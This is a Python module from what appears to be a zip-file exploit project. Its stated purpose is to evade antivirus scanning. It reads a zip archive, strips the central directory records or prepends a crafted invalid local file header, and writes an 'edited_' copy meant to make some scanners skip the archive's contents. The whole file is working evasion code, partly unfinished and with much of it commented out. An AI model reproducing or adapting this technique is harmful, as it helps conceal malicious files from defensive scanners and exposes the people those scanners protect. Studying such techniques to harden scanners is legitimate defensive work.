"""This implements an antivirus evasion technique for zip files
    
    By removeing the header for a file from the central directory some
    antivirus scanners skip a zipped file when scanning. When a zip file is
    processed with this tool it will automatically remove the central directory
    headers. The new file will have a prefix of edited_ attached to the file 
    name. 
"""
# import argparse
from exploit.utils import get_header_field
import os
# from posixpath import split

from .central_directory_header import CentralDirectoryHeader
from .end_central_dir_header import EndCentralDirectoryHeader
from exploit import end_central_dir_header
from .zip_file import Zip_file
from exploit import central_directory_header


# TODO update to only work on zip files
# TODO add to check for exceptions when writing to file
def read_in_file(file_loc):
    """Reads in the specified file and returns the hex

    Args:
        file_loc (str): The location of the zip file to read in

    Returns:
        str: The string representation of the hex of the file
    """
    with open(file_loc, 'rb') as f:
        file_hex = f.read().hex().lower()

    return file_hex


# # TODO split on central dir magic num then split [0] on other header magic num for all the parts
# # TODO add method to locate centrial directory and split it into the files that it contains

# # TODO check format for return tuple in doc
# def _split_zip_file_into_sections(file_hex):
#     """Splits the zip file_hex into the central directory other headers

#     Args:
#         file_hex (str): The hex code of the file to split

#     Returns:
#         tuple: (local_files (srt): The local files section of the zip,
#                 central_directory (str): The central directory of the zip
#                 end_central_directory_header (str): The end central directory
#                     header)
#     """
#     split_end_central_directory_header = file_hex.split('504b0506')
#     end_central_directory_header = EndCentralDirectoryHeader(
#         f'504b0506{split_end_central_directory_header[-1]}')
#     # print(f'end_central_directory_header: {end_central_directory_header}')

#     # TODO handle not a zip case
#     # print("not a zip file")
#     # return

#     # TODO add central directory headers to the list
#     central_directory = get_header_field(
#         file_hex, end_central_directory_header.get_offset_start_central_dir_from_start(),
#         end_central_directory_header.get_size_central_dir_bytes())
#     # split_central_directory_headers = split_end_central_directory_header[0].split(
#     # '504b0102', 1)
#     # central_directory = f'504b0102{split_central_directory_headers[-1]}'
#     # for x in split_central_directory_headers[1:]:
#     # print(f'central_directory_header: 504b0102{central_directory}')
#     # central_directory_headers.append(
#     # CentralDirectoryHeader(f'504b0102{x}'))

#     # print(central_directory_headers)

#     # split_local_file_header = split_central_directory_headers[0].split(
#     # '504b0304')

#     # TODO add stuff for local file header
#     local_files = file_hex[:end_central_directory_header.get_offset_start_central_dir_from_start()*2]
#     # split_central_directory_headers[0]
#     # for x in split_local_file_header[1:]:
#     #   print(f'local_file_header: 504b0304{x}')

#     #   print(file_hex.split("504b0102", 1))
#     # central_directory = None
#     # other_contents = None
#     return (local_files, central_directory, end_central_directory_header)


def _create_new_file_path(file_loc):
    """Creates a new path to the new location of the edited zip file

    The new path is the same as the old with 
    'edited_' added in front of the old file name

    Args:
        file_loc (str): The path to the original file

    Returns:
        str: The path to the location of the new file
    """
    # splits the file path between the head and the file name
    # head_tail[0]: path to the file
    # head_tail[1]: the name of the file
    head_tail = os.path.split(file_loc)
    # TODO give option so specify new file name or prefix
    new_path = os.path.join(head_tail[0], f'edited_{head_tail[1]}')

    return new_path


def write_out_file(file_loc, contents):
    """Writes the edited file out to disk

    The location of the new file it the same as the old with an updated name

    Args:
        file_loc (str): The location of the original file
        contents (srt): What will be written to the new file
    """

    # TODO check for errors thrown from the file write
    new_file_path = _create_new_file_path(file_loc)
    with open(new_file_path, 'wb') as f:
        f.write(bytes.fromhex(contents))
    # TODO add return for any errors or success


def main(file_loc, techniques):
    """The main function for the program

    Args:
        file_loc (str): The location of the original zip file for the exploit
        technique (dir): List of the techniques to ues
    """
    original_file_hex = read_in_file(file_loc)
    zip_file = Zip_file(original_file_hex)
    local_files = zip_file.get_local_file_headers()
    central_directory = zip_file.get_central_dir_hex()
    end_central_dir = zip_file.get_end_central_dir()
    # zip_file._split_central_dir()
    # local_files, central_directory, end_central_directory = _split_zip_file_into_sections(
    # original_file_hex)
    # print('\n\n\n')
    # print(original_file_hex)
    # print('\n\n\n')
    # print(local_files)
    # print('\n\n\n')
    # print(central_directory)
    # print('\n\n\n')
    # print(end_central_directory)
    # print('\n\n\n')
    invalid_file_header = ('504b03040a0000000000000000006745'
                           '23010000000000000000ffff0000612f'
                           '2f2f642f')
    # print(len(invalid_file_header))
    # fie.write_out_file(file_loc=file_loc,
    #                    contents=f'{local_files}')
    # new_zip_file = f'{local_files}'
    new_zip_file = ''
    if 'invalid_header' in techniques:
        zip_file.prepend_file(invalid_file_header)
        central_directory = zip_file.get_central_dir_hex()
        end_central_dir = zip_file.get_end_central_dir()
        new_zip_file = f'{invalid_file_header}{local_files}{central_directory}{end_central_dir.get_header_hex()}'

    if 'ghost' in techniques:
        new_zip_file = f'{new_zip_file}{local_files}'
    # else:
        # new_zip_file = f'{new_zip_file}{local_files}{central_directory}{end_central_dir.get_header_hex()}'
    write_out_file(file_loc=file_loc,
                   contents=new_zip_file)
